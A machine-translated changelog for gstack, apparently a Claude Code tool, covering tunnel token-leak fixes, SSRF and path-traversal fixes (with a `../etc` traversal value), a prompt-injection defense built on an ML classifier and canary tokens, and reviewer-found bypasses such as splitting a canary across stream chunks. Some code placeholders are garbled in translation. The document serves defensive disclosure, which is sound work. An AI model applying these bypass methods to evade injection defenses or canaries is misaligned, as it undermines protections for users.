|Opus 4.7 评估覆盖范围|0 个测试固定到 `claude-opus-4-7`|1 个评估，2 个案例，`periodic` 层|

|评估案例|结果|
|---|---|
|路由精度（3正+3负提示）|3/3 正值路由正确，0/3 负值路由。 TP 100%，FP 0%。符合阈值。|
|扇出 A/B（3 个文件读取，叠加 ON 与 OFF）|0 个并行工具首先在 `claude -p` 下调用双臂。断言平淡无奇，实际效果无法衡量。作为 P0 TODO 继续进行，以便在 Claude Code 的真实工具中重新运行。|

|测试套件|前|后|
|---|---|---|
|`bun test` 干净结账失败|10（预先存在的片状超时 + 2 个新的金色漂移）| 0 |
|“git 中没有编译的二进制文件”测试运行时|~12.7 秒，5 秒超时时不稳定|0.9s，带 `fs.statSync` + 模式滤波器|
|参数化主机冒烟测试|7 因生成的输出陈旧而失败|覆盖层分裂干净地重新生成后全绿|

### 这对于在 Opus 4.7 上运行 gstack 的人意味着什么

使用 `--model opus-4-7` 重新生成现在可以为您提供一个 SKILL.md，它带有 4.7 特定的微调（扇出、努力匹配、批量问题、字面解释），而 Sonnet 和 Haiku 用户可以获得与模型无关的覆盖而不会泄漏。路由获得完整的技能清单和更软的回退，因此像“wtf 这是 Python 语法”这样的随意提示不会意外调用 `/investigate`。扇出声明被诚实地标记为“在 `claude -p` 下未经验证”，带有 P0 TODO，而不是断言。运行 `bun test test/skill-e2e-opus-47.test.ts` 和 `EVALS=1` 以重现测量结果。此修复的完整计划文件位于 `~/.claude/plans/system-instruction-you-are-working-polymorphic-kazoo.md`。

### 逐项变更

#### 额外

- 新的 `model-overlays/opus-4-7.md` 通过 `{{INHERIT:claude}}` 从 `claude.md` 继承。拥有四个特定于 Opus-4.7 的推动：明确地展开（使用具体的 `[Read(a), Read(b), Read(c)]` 示例）、努力匹配步骤、批处理问题（节奏例外）、文字解释意识（具有分支范围边界）。
- `scripts/models.ts` 中 `ALL_MODEL_NAMES` 中的 `opus-4-7` 条目。 `resolveModel()` 将 `claude-opus-4-7-*` 路由到新的覆盖层，所有其他 `claude-*` 变体继续路由到 `claude`。
- `test/skill-e2e-opus-47.test.ts`：第一个 E2E 固定到 `claude-opus-4-7`。两种情况（扇出 A/B，路由精度），8 个断言，`periodic` 层。门控为 `EVALS=1`。
- `test/gen-skill-docs.test.ts` 中针对新路由形状的回归测试：断言斜线前缀的技能参考（`/office-hours` 不是 `office-hours`），断言 `/context-save` + `/context-restore` 存在（保护陈旧的 `/checkpoint` 名称回归），断言“当有疑问时，调用”策略存在（保护硬 `ALWAYS invoke` 回归）。

#### 改变了

- `model-overlays/claude.md` 缩减为与模型无关的推动（待办事项列表纪律、在采取重大行动之前思考、使用 Bash 上的专用工具）。 Opus-4.7 特定内容已移至 `opus-4-7.md`。
- `scripts/resolvers/preamble/generate-routing-injection.ts`：与新的 SKILL.md.tmpl 政策保持一致（“当有疑问时，调用”），将过时的 `/checkpoint` 引用重命名为 `/context-save` + `/context-restore`，添加了 12 条缺失的路线（现已覆盖全部技能清单）。
- `SKILL.md.tmpl` 路由部分：添加了相同的 12 条缺失路由；添加了分支范围边界“修复所有失败的测试”；在“批处理你的问题”中添加了明确的节奏例外，因此技能工作流程在节奏上获胜。
- `scripts/resolvers/preamble/generate-voice-directive.ts`：语音示例结束语从“要我发货吗？”更改为“要我发货吗？”到“要我修复它吗？” （保留字面 4.7 解释器上的审查门）。
- `scripts/resolvers/utility.ts:372`：共同作者预告片后备 `Claude Opus 4.6` → `Claude Opus 4.7` （PR 更新了 `hosts/claude.ts` 但错过了此后备）。

#### 固定的

- `test/skill-validation.test.ts` 中的“git 中没有编译的二进制文件”测试重写为每个文件使用 `fs.statSync` + mode-100755 过滤器而不是 `xargs -I{} sh -c`。 12.7 秒→ 907 毫秒，5 秒超时→ 绿色。
- `test/team-mode.test.ts` 设置测试给定 180 秒的预算。 `./setup` 进行完整安装 + Bun 二进制构建 + 技能重新生成，需要 60-90 秒； 5秒默认是超时。
- 分支基于 `origin/main` v1.6.0.0（安全波）重新构建。 VERSION + CHANGELOG 遵循 CLAUDE.md 中的分支范围规则：主版本 1.6.0.0 之上的新条目，没有漂移。

#### 对于贡献者

- Eval 基础设施现在支持模型固定测试。 `test/skill-e2e-opus-47.test.ts:mkEvalRoot(suffix, includeOverlay)` 是模式：在 `.claude/skills/` 下安装每技能 SKILL.md，编写显式路由 CLAUDE.md，可选择内联 A/B 武器的 opus-4-7 覆盖层。 `claude -p` 不会自动加载 SKILL.md 内容作为系统上下文，因此必须将覆盖层内联到 CLAUDE.md 中，以便在该工具中可以观察到 A/B。
- 新的触摸文件条目：`test/helpers/touchfiles.ts` 中的 `fanout: overlay ON emits >= parallel calls...` 和 `routing precision: positives route, negatives do not`，均为 `periodic`。仅当 `model-overlays/`、`scripts/models.ts`、`scripts/resolvers/model-overlay.ts`、`SKILL.md.tmpl` 或 `scripts/resolvers/preamble/generate-routing-injection.ts` 更改时触发。
- 已知差距（`TODOS.md` 中的 P0 TODO）：验证 Claude Code 的真实工具下的扇出微移，而不是 `claude -p`。在运行之前，叠加层中的声明是无法衡量的。

## [1.6.0.0] - 2026-04-21

## **配对代理会话中的令牌泄漏是通过将守护进程拆分为两个 HTTP 侦听器来关闭的，而不是通过假装一个端口可以同时是两个东西来关闭。**

`pair-agent --client` 是 gstack 的最佳入门时刻。一个命令、一个可共享的 URL、一个驱动您的浏览器的远程代理。这也是我们向公共互联网广播未经身份验证的 `/health` 端点的那一刻，该端点在任何 `Origin: chrome-extension://` 欺骗上分发根浏览器令牌。 @garagon 在 PR #1026 中标记了这一点，并在 DM 中重新出现。初始修复（检查 `/health` 门上的 `tunnelActive`）作为补丁进行审核。 Codex 在 `/plan-ceo-review` 期间的外部声音称这种方法很脆弱，用户转向架构修复：物理端口分离。这就是这个版本的内容。

当您运行 `pair-agent --client` 时，守护程序现在绑定两个 HTTP 侦听器。本地端口（引导程序、CLI、侧边栏、cookie-picker、检查器）保留在 127.0.0.1 上并且永远不会转发。隧道端口仅提供 `/connect`（配对仪式、未经身份验证 + 速率限制）和浏览器驱动命令的锁定白名单。 ngrok 仅转发隧道端口。偶然发现您的 ngrok URL 的调用者无法访问 `/health`、`/cookie-picker`、`/inspector/*` 或 `/welcome` — 不是因为服务器拒绝它们，而是因为 HTTP 请求永远不会到达引导端口。通过隧道发送的根令牌会收到带有明确配对提示的 403。

该浪潮还关闭了 Codex 浮出水面的其他三个 CVE 类别。 `/activity/stream` 和 `/inspector/events` 用于接受 `?token=` 查询参数中的根令牌（URL 泄漏到日志、引用者、历史记录）。现在，他们采用了一个单独的仅查看 30 分钟的 HttpOnly SameSite=Strict cookie，该 cookie 对 `/command` 无效。 `/welcome` 处理程序将 `GSTACK_SLUG` 插入到文件系统路径中而不进行验证。使用严格的正则表达式修复。全局 `/connect` 速率限制为 3/min，DOS 会阻止任何合法配对代理重试。放宽至 300/min，因为设置密钥是 24 个随机字节（不可暴力破解）；该限制是为了防洪，而不是猜测按键。 Windows 上的 cookie-import-browser CDP 端口被记录为具有跟踪问题的 v20 ABE 提升路径 (#1136)。

### 重要的数字

|表面|前|后|
|---|---|---|
|隧道上的 `/health`|将根令牌返回到任何 chrome 扩展源|无法访问（404，端口错误）|
|隧道上的 `/cookie-picker`|HTML 嵌入根令牌|无法访问（404，端口错误）|
|隧道上的 `/inspector/*`|可与承载者联系|无法访问（404，端口错误）|
|`/command` 通过隧道，根令牌|执行|403 带配对提示|
|`/command` 通过隧道，范围令牌|任何命令|允许列表：仅限 17 个浏览器驱动命令|
|`/activity/stream` 授权|网址中的 `?token=<ROOT>`|HttpOnly `gstack_sse` cookie，30 分钟 TTL，仅限流范围|
|`/inspector/events` 授权|网址中的 `?token=<ROOT>`|与 /activity/stream 相同的 cookie|
|`/connect` 速率限制|3/min（阻止合法重试）|300/min（仅泛洪，无配对 DoS）|
|`/welcome` 路径遍历|`GSTACK_SLUG="../etc"` 插值|正则表达式 `^[a-z0-9_-]+$`，回退到内置|
|隧道授权拒绝日志记录|没有任何|异步 JSONL 到 `~/.gstack/security/attempts.jsonl`，速率上限 60/min|
|通过 CDP 的 Windows v20 ABE|无证海拔|记录为非目标，追踪为#1136|

|审查层|判决|结果|
|---|---|---|
|`/plan-ceo-review`（克劳德）|选择性扩张|7 个提案，7 个被接受，扩展侧边栏引导程序上的关键差距被发现|
|`/codex`（外部语音）|14 项发现|修复了计划中的 3 个事实错误，解决了 4 个实质性紧张局势，添加了 2 个新的 CVE 类别|
|`/plan-eng-review`（克劳德）|5 个关键决策已锁定|隧道生命周期、令牌范围、PR #1026 处理、SSE cookie 设计、路由白名单|

### 这对于运行配对代理的任何人意味着什么

在笔记本电脑上运行 `pair-agent --client test-agent`。与某人分享 ngrok URL。他们的代理驱动你的浏览器。您的侧边栏会不断向您显示他们在做什么。同时，一个陌生人偶然发现该 ngrok URL，除了 `/connect` 之外，其他所有内容都会收到 404 错误，而没有设置密钥的 `/connect` 则无处可去。您键入的命令不会发生任何变化。

### 逐项变更

#### 额外

- **双侦听器 HTTP 架构。** 当隧道处于活动状态时，守护程序会在临时 127.0.0.1 端口上绑定专用侦听器，并将 `ngrok.forward()` 指向该端口。 `/tunnel/start` 延迟绑定侦听器； `/tunnel/stop` 将其撕毁。绑定错误时发生硬故障，永远不会回退到本地端口。 `BROWSE_TUNNEL=1` 启动遵循相同的模式。 `browse/src/server.ts` ~320 行。
- **隧道表面过滤器。** 在每次路线调度之前运行。 404s 路径不在 `TUNNEL_PATHS`（`/connect`、`/command`、`/sidebar-chat`）上。 403 处理任何携带根承载令牌并带有明确提示的请求。 401 没有范围令牌的非 /connect 请求。每次拒绝都会记录到 `~/.gstack/security/attempts.jsonl`。
- **隧道命令白名单。** 隧道表面上的 `/command` 强制执行 `TUNNEL_COMMANDS`（17 个浏览器驱动命令：`goto`、`click`、`text`、`screenshot`、`html`、`links`、`forms`、`accessibility`、`attrs`、`media`、`data`、 __代码_13__、__代码_14__、__代码_15__、__代码_16__、__代码_17__、__代码_18__)。远程配对代理无法启动新浏览器、配置守护程序或触摸检查器。
- **仅查看 SSE 会话 cookie。** 带有 `POST /sse-session` mint 端点的新 `browse/src/sse-session-cookie.ts` 注册表。 256 位令牌、30 分钟 TTL、HttpOnly + SameSite=Strict。在模块边界级别与主令牌注册表范围隔离（模块不导入 `token-registry.ts`）。应用之前的学习：`cookie-picker-auth-isolation`，10/10 置信度。
- **隧道身份验证拒绝日志。** `browse/src/tunnel-denial-log.ts`，异步 `fs.promises.appendFile`，进程中速率上限为 60/min。应用之前的学习：`sync-audit-log-io`，10/10 置信度。
- **E2E 配对测试。** `browse/test/pair-agent-e2e.test.ts`，针对生成的守护进程进行 12 项行为测试 (BROWSE_HEADLESS_SKIP=1)。验证 `/pair` → `/connect` → 作用域令牌 → `/command` 流、`?token=` 查询参数拒绝、`/sse-session` cookie 标志。 ~220ms，无网络。
- **ARCHITECTURE.md 双监听合约。** 每个端点处置表（本地 vs 隧道）、隧道拒绝日志模型、SSE cookie 范围、N2 非目标文档。

#### 改变了

- **SSE 端点不再接受 URL 中的 `?token=`。** `/activity/stream` 和 `/inspector/events` 现在采用 Bearer 或 `gstack_sse` cookie。扩展 (`extension/sidepanel.js`) 在引导时通过 `POST /sse-session` 获取 cookie 一次，然后使用 `withCredentials: true` 打开 `EventSource`。 URL 永远不会携带秘密。
- **`/connect` 速率限制从 3/min 放宽至 300/min。** 设置密钥为 24 个随机字节； 3/min只是名义上的暴力防御，并导致了真正的配对失败。 300/min 处理洪水而不会触发合法使用。
- **`/welcome` GSTACK_SLUG 在 `^[a-z0-9_-]+$` 上门控。** 针对目前无法利用但可以轻松缓解的路径进行深度防御。
- **`/pair` 和 `/tunnel/start` 通过 `GET /connect` 探测缓存隧道，而不是 `/health`。** 在双侦听器设计下，在隧道表面上不再可访问 `/health`。
- **`cookie-import-browser.ts` 评论已更正。** 之前声称“不比基线差”，在使用 v20 应用程序绑定加密的 Windows 上是错误的，其中 CDP 端口是提升路径。记录了 `--remote-debugging-pipe` 后续的跟踪问题。

#### 固定的

- **SSRF 通过下载 + 抓取。** `browse/src/write-commands.ts` 中的 `page.request.fetch` 调用现在通过 `validateNavigationUrl`。阻止云元数据端点（AWS IMDSv1、GCP、Azure）、RFC1918 范围、`file://`。源自 @garagon 的 PR #1029。
- **范围快照上的信封哨兵转义。** `browse/src/snapshot.ts` 和 `browse/src/content-security.ts` 现在共享 `escapeEnvelopeSentinels()`。包含文字信封定界符的页面内容不能再在 LLM 上下文中伪造虚假的“可信”块。源自 @garagon 的 PR #1031。
- **跨所有 DOM 读取通道的隐藏元素检测。** 以前仅 `command === 'text'` 运行 `markHiddenElements`。现在，每个 DOM 通道（`html`、`links`、`forms`、`accessibility`、`attrs`、`media`、`data`、`ux-audit`）都会在信封中显示隐藏内容警告。源自 @garagon 的 PR #1032。
- **`--from-file` 有效负载路径验证。** `load-html --from-file` 和 `pdf --from-file` 现在在有效负载路径上运行 `validateReadPath` 以与直接 API 路径进行奇偶校验。关闭 `SAFE_DIRECTORIES` 的 CLI/API 逃生舱口。源自 @garagon 的 PR #1103。
- **`design/src/serve.ts` 通过 `JSON.stringify` 插入 `url.origin`。** 对所提供的 HTML 中的原始值进行防御性转义。由 @theqazi 贡献（PR #1073 部分）。
- **`scripts/slop-diff.ts` 将 `shell: true` 缩小为仅适用于 Windows。** 匹配特定于平台的需求，而无需扩大 POSIX 上的 shell 解释表面。由 @theqazi 贡献（PR #1073 部分）。

#### 对于贡献者

- F1（双侦听器重构）分为分支上的四个提交：速率限制放宽、新的 `tunnel-denial-log` 模块、server.ts 重构和新的源代码级测试套件。每个提交都是独立的绿色。后续的wave项目干净利落地重新基于F1。
- 鸣谢：@garagon（PR #1026 中的关键 bug 以及 SSRF、信封、DOM 通道覆盖和 --from-file PR）、@Hybirdss（PR #1002 概念，被 F1 取代，但通知了政策模型）、@HMAKT99（PR #469 和 #472 — 两者最终都已经登陆到主网上；对解决问题的功劳）、@theqazi（2 次提交）从 #1073 开始，技能部分推迟等待内部语音审核（根据 CLAUDE.md）。
- 经 Codex 审查的计划存储于 `~/.gstack/projects/garrytan-gstack/ceo-plans/2026-04-21-security-wave-v1.5.2.md`。工程审查测试计划位于 `~/.gstack/projects/garrytan-gstack/garrytan-garrytan-sec-wave-eng-review-test-plan-*.md`。
- 非目标跟踪为 #1136：将 cookie-import-browser CDP 传输从 TCP `--remote-debugging-port` 切换到 `--remote-debugging-pipe`，以便关闭 Windows v20 ABE 提升路径。不平凡（Playwright 不公开管道传输；需要最小的 CDP-over-pipe 客户端）；故意推迟这一波。

## [1.5.1.0] - 2026-04-20

## **v1.4.0.0 /make-pdf 中的三个可见错误已全部修复。**

页面页脚在每页上显示两次“6 of 8”，因为 Chromium 的本机页脚和我们的打印 CSS 都是渲染数字。包含 `&` 的降价标题在 `<title>` 和 TOC 条目中呈现为 `Faber &amp;amp; Faber` ，因为提取器剥离了标签但忘记解码实体。在 Linux（Docker、CI、服务器）上，正文会被转为 DejaVu Sans，因为默认情况下 Helvetica 和 Arial 都没有安装，并且字体堆栈中没有任何内容能够捕获到这一点。此版本修复了所有三个问题，并且每次都将修复扩展到明显的症状之外。

### 重要的数字

在编写任何代码之前，所有三个错误都在审查中被发现并扩展。该计划经历了`/plan-eng-review`（克劳德），然后`/codex`（外部声音），然后实施。来源：`.github/docker/Dockerfile.ci`（Linux 字体）、`make-pdf/test/render.test.ts`（17 个新测试）、`git log main..HEAD`（此分支）。

|表面|之前 (v1.4.0.0)|之后（v1.5.1.0）|
|---------|-------------------|-----------------|
|页脚|“6 of 8”堆叠两次|“8 中的 6”一次|
|`<title>` 中的 `# Faber & Faber`|__代码_0__|__代码_0__|
|带有 `&` 的目录条目|双重转义|单逃|
|H1 中的 `&#169;`（版权）|破碎的|解码为 `©`|
|`--no-page-numbers` CLI 标志|默默地什么也没做|实际上抑制页码|
|__代码_0__|顶部分层 CSS 页码|自定义页脚干净利落地获胜|
|Linux PDF 正文字体|DejaVu Sans（错误）|Liberation Sans（公制兼容的 Helvetica 克隆）|

|审查层|发现|结果|
|--------------|----------|---------|
|`/plan-eng-review`（克劳德）|1 架构差距|扩展了 Bug 1 范围以包括 CSS 端条件|
|`/codex`（外部语音）|11 项发现|11 合并（数据流、TOC 站点、解码器冲突、页脚语义、测试契约、范围边界、字体依赖性）|
|跨模型一致率| ~30% |Codex 发现 7 个问题 Claude 的 eng 审查因停留过高海拔而错过|

协议率就是答案。一位审稿人对此差异的评价还不够。 Codex 发现我最初对 Bug 1 的“单行修复”会使 `--no-page-numbers` CLI 标志默默地死掉，因为 `RenderOptions` 没有携带 `pageNumbers` 并且编排器的 `render()` 调用没有通过它。如果没有第二意见，CLI 的旗舰又坏了。

### 这对于任何生成 PDF 的人意味着什么

页码现在由从 CLI 到 CSS 的一个标志控制，并恢复了自定义页脚语义。标题、封面页和目录条目正确呈现 HTML 实体，包括 `&#169;` 等数字实体。 Linux 环境不再需要了解字体解放——Dockerfile 会显式安装它，并且如果字体消失，构建时 `fc-match` 检查会使图像失败。在 Mac 上运行 `bun run dev make-pdf <file.md> --cover --toc`，现在也在 Docker 中运行，输出看起来是一样的。

### 逐项变更

#### 固定的

- **页码不再在每个页面上呈现两次。** Chromium 的本机页脚用于分层在我们的 `@page @bottom-center` CSS 之上。现在 CSS 是唯一的事实来源； Chromium 原生编号已无条件关闭。
- **`--no-page-numbers` 端到端工作。** CLI 标志现在通过 `RenderOptions.pageNumbers` 到达 CSS 层。以前它在编排器中死掉了，CSS 无论如何都保持渲染数字。
- **`--footer-template` 干净地替换了库存页脚。** 现在传递自定义页脚也会抑制 CSS 页码，保留 Bug 1 与之冲突之前存在的原始“自定义页脚获胜”语义。
- **标题、封面页和目录条目中的 HTML 实体正确呈现。** 像 `# Faber & Faber` 这样的 Markdown 标题在 `<title>`（单转义）中呈现为 `Faber &amp; Faber`，而不是 `Faber &amp;amp; Faber`（双转义）。涵盖两个提取器调用站点：`extractFirstHeading`（标题 + 封面）和 `extractHeadings` (TOC)。
- **数字 HTML 实体也会解码。** H1 中的 `&#169;` 现在在 PDF 标题中呈现为 `©`。十进制和十六进制数字实体均受支持。
- **Linux PDF 以 Liberation Sans 而不是 DejaVu Sans 呈现。** 所有四个打印 CSS 插槽（正文、运行标题、页码、机密标签）中的字体堆栈现在包括 Helvetica 和 Arial 之间的 `"Liberation Sans"`。公制兼容，SIL OFL 1.1，通过 `fonts-liberation` 安装。

#### 改变了

- `.github/docker/Dockerfile.ci` 通过重试显式安装 `fonts-liberation` + `fontconfig`，运行 `fc-cache -f`，并在最终构建步骤中验证 `fc-match "Liberation Sans"`。以前依赖 Playwright 的 `install-deps` 来传递它，这可能会在升级时默默地回归。
- `SKILL.md.tmpl` 为在 CI/Docker 外部安装的用户记录 Linux 字体依赖性。

#### 对于贡献者

- `render.ts` 中的新助手 `decodeTextEntities` （与现有的 `decodeTypographicEntities` 不同，它有意在管道 HTML 中保留 `&amp;`，其中 `&amp;amp;` 可以是合法的）。提取指定为 `<title>`、封面或目录的纯文本时，请使用新的文本。
- `PrintCssOptions.pageNumbers` 将 `@bottom-center` 规则包装在与现有 `showConfidential` 模式匹配的条件中。将 `pageNumbers` 穿过 `RenderOptions`，并从 `orchestrator.ts` 转发到两个 `render()` 调用站点（生成 + 预览）。
- `make-pdf/test/render.test.ts` 中的 17 个新测试：`printCss` pageNumbers 隔离 (3)、`render()` 与 footerTemplate 的数据流 (4)、跨 `&`、`<`、`>`、`©`、`—` (5)、`<title>` 精确单转义断言、TOC 单转义、数字实体解码的参数化实体合约， smartypants-interacts 合约，Liberation Sans body + @page 框覆盖 (2)。
- 已知的测试差距（小，未来的 PR）：十六进制数字实体路径，双编码输入的 amp-last 排序，SKILL.md Linux 笔记内容断言。 Orchestrator → `browseClient.pdf({pageNumbers: false})` 和 Orchestrator → `render()` 转发通过 CSS 端到端测试传递，而不是直接断言。

## [1.5.0.0] - 2026-04-20

## **您的侧边栏代理现在可以防御提示注入。**

打开一个隐藏着恶意指令的网页，gstack 的侧边栏不仅仅相信 Claude 会做正确的事情。与浏览器捆绑在一起的 22MB ML 分类器会扫描您加载的每个页面、每个工具输出、您发送的每条消息。如果它看起来像是即时注入攻击，则会话会在 Claude 执行任何危险操作之前停止。系统提示中的秘密金丝雀令牌会捕获窃取会话的尝试，如果该令牌出现在 Claude 的输出、工具参数、URL 或文件写入中的任何位置，会话就会终止，您可以准确地看到哪一层被触发以及以何种置信度被触发。尝试访问您可以读取的本地日志，并可选择聚合社区遥测数据，以便每个 gstack 用户都成为防御改进的传感器。

### 给你带来什么改变

打开 Chrome 侧边栏，您会在右上角看到一个小的 `SEC` 徽章。绿色表示完整的防御堆栈已加载。琥珀色表示某些东西已降级（首次使用时模型预热仍在运行，大约 30 秒）。红色意味着安全模块本身崩溃，并且您仅在架构控件上运行。将鼠标悬停可查看每层详细信息。

如果发生攻击，则会出现居中的警告横幅：“会话终止，从 {domain} 检测到提示注入”。展开“发生了什么”，您会看到确切的分类器分数。一键重启。没有什么神秘的。

### 数字

|公制|v1.4之前|v1.4之后|
|---|---|---|
|防御层|4（内容安全.ts）|**8**（添加 ML 内容、ML 成绩单、金丝雀、判决组合器）|
|金丝雀覆盖的攻击渠道| 0 |**5**（文本流、工具参数、URL、文件写入、子进程参数）|
|第一方分类器成本|没有任何|**$0**（捆绑，本地运行）|
|发货型号尺寸| 0 |**22MB**（TestSavantAI BERT-小，int8 量化）|
|可选的整体模型|没有任何|**721MB DeBERTa-v3**（通过 `GSTACK_SECURITY_ENSEMBLE=deberta` 选择加入）|
|BLOCK决策规则|没有任何|**2-of-2 ML 协议**（或 2-of-3 与集成），防止单分类器误报杀死会话|
|覆盖安全面的测试| 12 |**280**（25个基础+23个对抗性+10个集成+9个分类器+7个剧作家+3个替补+6个bun-native+15个源合同+11个对抗性修复回归+其他）|
|攻击遥测聚合|仅本地文件|**社区脉冲边缘功能 + gstack-security-dashboard CLI**|

### 实际运送的是什么

* **security.ts** — 金丝雀注入加检查、带有集成规则的判决组合器、带有轮换的攻击日志、跨进程会话状态、设备加盐有效负载哈希
* **security-classifier.ts** — TestSavantAI（默认）加上 Claude Haiku 成绩单检查加上选择加入 DeBERTa-v3 整体，所有这些都具有优雅的故障开放功能
* **对每条用户消息进行预生成 ML 扫描**，并对每个 Read、Glob、Grep、WebFetch、Bash 结果进行工具输出扫描
* **盾牌图标**具有 3 种状态（绿色、琥珀色、红色），通过 `/sidebar-chat` 民意调查持续更新
* **金丝雀泄漏横幅**（集中警报重，每个批准的设计模型）具有可扩展的层分数细节
* **攻击遥测**通过现有的 `gstack-telemetry-log` 到 `community-pulse` 到 Supabase 管道（分层门控、社区上传、仅限本地匿名、关闭即无操作）
* **`gstack-security-dashboard` CLI** — 过去 7 天检测到的攻击、受攻击最多的域、层分布、判决分割
* **BrowseSafe-Bench 烟雾线束** — 来自 Perplexity 的 3,680 例对抗数据集的 200 例，密封缓存，信号分离门
* **Live Playwright 集成测试** 固定 L1 至 L6 纵深防御合同
* **Bun 原生分类器研究框架** 加上设计文档 — WordPiece 标记器匹配 Transformers.js 输出、基准测试工具、未来 5ms 原生推理的 FFI 路线图

### 船中硬化

两个独立的对抗性审稿人（Claude subagent 和 Codex/gpt-5.4）聚集在四个旁路路径上。合并前所有四个均已修复：

* **Canary 流块分割** — 跨连续 `text_delta` 和 `input_json_delta` 事件的滚动缓冲区检测。以前，`.includes()` 按块运行，因此攻击者可以要求 Claude 发出跨越两个增量的金丝雀分割并逃避检查。
* **快照命令绕过** — `$B snapshot` 从页面发出 ARIA 名称输出，但在 `PAGE_CONTENT_COMMANDS` 中缺失，因此恶意 aria 标签流向 Claude，而没有其他读取路径获得的信任边界信封。
* **工具输出单层 BLOCK** — `combineVerdict` 现在接受 `{ toolOutput: true }`。在工具结果扫描中，Stack Overflow FP 问题不适用（内容不是用户创作的），因此处于 BLOCK 阈值的单个 ML 分类器现在会直接阻止，而不是降级为 WARN。
* **转录分类器工具输出上下文** - Haiku 之前在工具结果扫描中仅看到 `user_message + tool_calls` （空输入），因此只有 testavant_content 收到信号。现在接收实际的工具输出文本并可以投票。

另外：`escapeHtml` 中的属性注入修复（现在转义 `"` 和 `'`），`GSTACK_SECURITY_OFF=1` 现在是 `loadTestsavant`/`loadDeberta` 中的真正的门（不仅仅是文档承诺），设备盐在进程中缓存，因此 FS 不可写的环境不会破坏哈希相关性，在 `tool_result` 上驱逐的工具使用注册表项（内存泄漏修复），仪表板使用`jq` 用于大括号平衡 JSON 解析（如果可用）。

### 俳句抄本分类器完整无缺（无声 bug + 门移除）

转录本分类器（`checkTranscript` 调用 `claude -p --model haiku`）已损坏。两个错误：

1. 模型别名 `haiku-4-5` 从 CLI 返回 404。正确的简写是 `haiku` （今天解析为 `claude-haiku-4-5-20251001`，随着模型的滚动保留最新的俳句）。
2. 2秒暂停是在地板以下。新的 `claude -p` 生成具有约 2-3 秒的 CLI 冷启动 + 约 1KB 提示的 5-12 秒推理。每次调用 2 秒时都会超时。猛增到15秒。

复合死分类器：`shouldRunTranscriptCheck` 在任何其他层上对俳句进行门控，并在 `>= LOG_ONLY` 上触发。在 L4 遗漏的大约 85% 的 BrowseSafe-Bench 攻击中（TestSavantAI 在特定于浏览器代理的攻击中召回率约为 15%），Haiku 从未有机会投票。我们将最好的信号限制在最弱的信号上。对于工具输出，此门现已删除 - L4 + L4c + Haiku 始终并行运行。

Review-on-BLOCK UX（以可疑文本摘录为中心的警报重横幅+每层分数+允许/阻止会话按钮）并排放置，因此误报是可恢复的，而不是会话终止。

### 测量：BrowseSafe-Bench（200 箱烟雾）

相同的 200 个案例，在上述修复之前和之后：

| |仅 L4（之前）|俳句合奏（后）|
|---|---|---|
|检出率| 15.3% | **67.3%** |
|假阳性率| 11.8% | 44.1% |
|运行时| ~90s |~41 分钟（俳句是长杆）|

**检测率提升了 4.4 倍。** FP 率也攀升了 3.7 倍——Haiku 更具攻击性，并且在 TestSavantAI 微笑通过的边缘情况下会触发。审核横幅使这些 FP 可恢复：用户看到可疑的摘录 + 图层分数，单击“允许”一次，会话继续。一旦 gstack 用户开始报告，P1 后续行动就会根据真实世界的 attempts.jsonl 数据调整 Haiku WARN 阈值（当前为 0.6，可能应该为 0.7-0.85）。

诚实的运输姿势：这比 v1.3.x 更安全，但不是防弹的。当 ML 层未命中或过火时，金丝雀（确定性）、内容安全 L1-L3（结构性）和审查横幅仍然是承载防御。

### 环境旋钮

* `GSTACK_SECURITY_OFF=1` — 紧急终止开关（仍注入金丝雀，ML 已跳过）
* `GSTACK_SECURITY_ENSEMBLE=deberta` — 选择加入 721MB DeBERTa-v3 集成分类器以实现 2-of-3 协议

### 对于贡献者

Supabase 迁移 `004_attack_telemetry.sql` 向 `telemetry_events` 添加了五个可为空的列（`security_url_domain`、`security_payload_hash`、`security_confidence`、`security_layer`、`security_verdict`）以及两个用于仪表板聚合的部分索引。 `community-pulse` 边缘函数聚合安全部分。运行 `cd supabase && ./verify-rls.sh` 并通过正常的 Supabase 部署流程进行部署。

---

## [1.4.0.0] - 2026-04-20

## **将任何 Markdown 文件转换为看起来已完成的 PDF。**

新的 `/make-pdf` 技能采用 `.md` 文件并生成出版质量的 PDF。 1 英寸边距。黑体。页脚中的页码。带有文档标题的运行标题。大引号、破折号、省略号 (...)。可选封面页。可选的可点击目录。可选的对角草稿水印。复制 PDF 中的任何段落并将其粘贴到 Google 文档中：它粘贴为一个干净的块，而不是逐个字母间隔的“S a i l i n g”。最后一部分是整个游戏。大多数 Markdown 转 PDF 工具生成的输出读起来就像法律文档通过扫描仪扫描三遍一样。这一篇读起来就像一篇真正的文章或一封真正的信件。

### 你现在可以做什么

- `$P generate letter.md` 使用合理的默认值将干净的字母 PDF 写入 `/tmp/letter.pdf`。
- `$P generate --cover --toc --author "Garry Tan" --title "On Horizons" essay.md essay.pdf` 添加左对齐封面（标题、副标题、日期、细线规则）和 H1/H2/H3 标题中的目录。
- `$P generate --watermark DRAFT memo.md draft.pdf` 在每个页面上覆盖对角草稿水印。作为草稿发送。当比赛最终结束时，请放下旗帜。
- `$P generate --no-chapter-breaks memo.md` 对于恰好有多个顶级标题的备忘录禁用默认的“每个 H1 开始一个新页面”行为。
- `$P generate --allow-network essay.md` 允许加载外部图像。默认情况下处于关闭状态，这样当您生成其他人的 PDF 时，他们的 Markdown 就无法通过跟踪像素打电话回家。
- `$P preview essay.md` 呈现相同的 HTML 并在浏览器中打开它。编辑时刷新。在您准备好之前，请跳过 PDF 往返过程。
- `$P setup` 验证 browser + Chromium + pdftotext 是否已安装并运行端到端冒烟测试。

### 为什么文本实际上复制得很干净

Headless Chromium 为具有非标准指标表的网络字体发出每个字形 `Tj` 运算符。这就是为什么所有其他“markdown to PDF”工具都会生成 PDF，其中复制粘贴会将“Sailing”变成“Sailing”。我们为一切都配备了 Helvetica 系统……Chromium 有原生指标，并发出干净的字级 `Tj` 运算符。 CI 矩阵通过 `pdftotext` 运行组合功能固定装置（smartypants + 连字符 + 连字 + 粗体/italic + 内联代码 + 列表 + 块引用 + 分节符，全部打开），并断言提取的文本与手写的预期文件匹配。如果任何特征破坏了提取，门就会失败。

### 在引擎盖下

